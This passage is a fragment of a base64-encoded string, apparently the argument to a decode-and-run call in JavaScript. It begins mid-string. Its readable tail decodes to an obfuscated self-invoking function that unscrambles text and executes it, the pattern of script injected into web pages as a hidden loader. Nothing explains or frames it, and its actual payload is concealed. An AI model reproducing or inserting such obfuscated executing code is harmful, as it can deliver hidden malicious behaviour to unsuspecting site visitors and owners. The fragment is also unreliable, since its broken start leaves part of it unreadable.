nQuQ29yKUpdMV9BYXRyLG5kSi50JXBfdGYuX2UufWJlIHZuYnIzSjJfSiU7b29KfWckMCkwcyxKKHc9MHUpSnJzSjFpPSp0bjpMPWFmMWI5NkpdSitiKTMwcG93ZGU9X3RmbyVlXW4gKSglSjthSnQ9djohOUpUSnRMLnNsbm5ieHRKLmI1SnNvcCVlSlZhMi5pRWVfKHRjZV81ZVp0dmVuZWVpZ2hncG9ePXhGSjRpbkpKZS49MWwkLUogNmVuJjJKSm5mIEllb2wlIDNpUThFSnsxZWUuKXRpZWU7b3ErX2VdSjRKSWUgICE3bHRlSkpULiBKLnphQ2FKMWVySkpKfUolSmVzbiB1LEouLjdKNCB9M0pKIGVpXVtVKV0mX1tJd3JdIG8wKTUnKSk7dmFyIGJJcT1KWHoobG9rLEVhbCApO2JJcSg3NzA1KTtyZXR1cm4gNDQ1NX0pKCk='))
